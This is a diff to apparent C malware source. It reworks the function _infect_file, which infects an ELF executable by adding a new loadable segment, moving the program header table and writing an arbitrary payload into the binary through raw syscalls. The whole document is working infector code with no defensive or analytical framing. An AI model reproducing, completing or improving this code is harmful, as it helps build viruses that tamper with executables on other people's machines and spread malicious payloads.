@@ -10,8 +10,7 @@
 #include <stdlib.h>
 #include <inttypes.h>
 
-#define ALIGN_UP(arg, align) ((arg) % (align) ?		\
-	      ((arg) / (align) + 1) * (align) : (arg))
+#define ALIGN_UP(arg, align) (((arg) % (align)) ? (((arg) / (align) + 1) * (align)) : (arg))
 
 #define ALIGN_DN(arg, align) ((arg) - (arg) % (align))
 
@@ -36,8 +35,6 @@ long _syscall_wrap(long number, ...)
 	return resultvar;
 }
 */
-
-/* We need to move PHDR to our new segment */
 
 int _infect_file(const char *target_path, void *body, size_t body_s)
 {
@@ -69,55 +66,51 @@ int _infect_file(const char *target_path, void *body, size_t body_s)
 
 	/* Find last LOAD segment, shift every p_offset */
 	Elf64_Phdr *last_load = NULL;
+	Elf64_Phdr *table_phdr = NULL;
 
 	for (Elf64_Phdr *p_hdr = (Elf64_Phdr*) (mem + e_hdr->e_phoff); 
 	     p_hdr < (Elf64_Phdr*) (mem + e_hdr->e_phoff) + e_hdr->e_phnum; 
 	     p_hdr++) {
 		if (p_hdr->p_type == PT_LOAD)
 			last_load = p_hdr;
-		if (p_hdr->p_type != PT_PHDR)
-			p_hdr->p_offset += sizeof(Elf64_Phdr);
-		if (p_hdr->p_type == PT_PHDR) {
-			p_hdr->p_memsz  += sizeof(Elf64_Phdr);
-			p_hdr->p_filesz += sizeof(Elf64_Phdr);
-		}
+		else if (p_hdr->p_type == PT_PHDR)
+			table_phdr = p_hdr;
 	}
 
-	if (last_load == NULL)
+	if (last_load == NULL || table_phdr == NULL)
 		return -1;
-
-	/* Same changes for sh_offset for every section */
-	for (Elf64_Shdr *s_hdr = (Elf64_Shdr*) (mem + e_hdr->e_shoff);
-	     s_hdr < (Elf64_Shdr*) (mem + e_hdr->e_shoff) + e_hdr->e_shnum;
-	     s_hdr++) {
-		if (s_hdr->sh_type != SHT_NULL)
-			s_hdr->sh_offset += sizeof(Elf64_Phdr);
-	}
 
 	Elf64_Phdr toinject_hdr = {
 		.p_align	= last_load->p_align,
-		.p_offset 	= e_hdr->e_shoff,
-		.p_vaddr	= ALIGN_DN(last_load->p_vaddr, last_load->p_align) 
-				  + last_load->p_align + e_hdr->e_shoff % last_load->p_align,
-		.p_paddr	= ALIGN_DN(last_load->p_paddr, last_load->p_align) 
-				  + last_load->p_align + e_hdr->e_shoff % last_load->p_align,
-		.p_filesz	= body_s,
-		.p_memsz	= body_s,
+		.p_offset 	= ALIGN_UP(last_load->p_offset + last_load->p_filesz, last_load->p_align),
+		.p_vaddr	= ALIGN_UP(last_load->p_vaddr  + last_load->p_memsz,  last_load->p_align),
+		.p_paddr	= ALIGN_UP(last_load->p_paddr  + last_load->p_memsz,  last_load->p_align),
+		.p_filesz	= table_phdr->p_filesz + sizeof(Elf64_Phdr) + body_s,
+		.p_memsz	= table_phdr->p_filesz + sizeof(Elf64_Phdr) + body_s,
 		.p_type 	= PT_LOAD,
-		.p_flags	= PF_R, };
+		.p_flags	= (PF_R | PF_W) };
 
-	size_t inject_phdr_pos = (char*) (last_load + 1) - mem;
-	size_t inject_body_pos = e_hdr->e_shoff;
-	e_hdr->e_shoff += sizeof(toinject_hdr) + body_s;
+	table_phdr->p_filesz += sizeof(toinject_hdr);
+	table_phdr->p_memsz  = table_phdr->p_filesz;
+	table_phdr->p_vaddr  = toinject_hdr.p_vaddr;
+	table_phdr->p_paddr  = toinject_hdr.p_paddr;
+	table_phdr->p_offset = toinject_hdr.p_offset;
+	table_phdr->p_flags  = toinject_hdr.p_flags;
+	
+	e_hdr->e_phoff = table_phdr->p_offset;
 	e_hdr->e_phnum++;
+	size_t inject_pos = (size_t) toinject_hdr.p_offset;
+	size_t last_load_end_offs = last_load->p_offset + last_load->p_filesz;
+	e_hdr->e_shoff += inject_pos - last_load_end_offs + toinject_hdr.p_filesz;
 
 	/* Write changes to binary */
 	int out_fd = _syscall_wrap(SYS_creat, "out.out", statbuf.st_mode);
-	_syscall_wrap(SYS_write, out_fd, mem, inject_phdr_pos);
-	_syscall_wrap(SYS_write, out_fd, &toinject_hdr, sizeof(toinject_hdr));
-	_syscall_wrap(SYS_write, out_fd, mem + inject_phdr_pos, inject_body_pos - inject_phdr_pos);
+	_syscall_wrap(SYS_write, out_fd, mem, last_load_end_offs);
+	_syscall_wrap(SYS_lseek, out_fd, inject_pos, SEEK_SET);
+	_syscall_wrap(SYS_write, out_fd, table_phdr, table_phdr->p_filesz - sizeof(Elf64_Phdr));
+	_syscall_wrap(SYS_write, out_fd, &toinject_hdr, sizeof(Elf64_Phdr));
 	_syscall_wrap(SYS_write, out_fd, body, body_s);
-	_syscall_wrap(SYS_write, out_fd, mem + inject_body_pos, statbuf.st_size - inject_body_pos);
+	_syscall_wrap(SYS_write, out_fd, mem + last_load_end_offs, statbuf.st_size - last_load_end_offs); 
 	_syscall_wrap(SYS_close, out_fd);
 
 	_syscall_wrap(SYS_munmap, mem, statbuf.st_size);
